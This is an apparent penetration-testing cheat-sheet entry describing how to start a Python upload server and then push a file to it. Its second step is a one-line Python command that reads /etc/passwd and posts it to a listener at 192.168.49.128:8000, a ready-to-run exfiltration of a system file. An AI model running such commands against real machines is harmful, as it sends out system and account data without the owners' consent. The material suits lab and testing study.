# HTTP: Python Upload Server

OS: Linux
Description: Spin up Python Upload Server HTTP
Security Domains: File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21)
Target_Technology: python (https://www.notion.so/python-1444c8e523768064b118fb3c0d424051?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

### Python Upload Server

- Step 1

```jsx
python3 -m uploadserver
```

- Step 2

```jsx
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```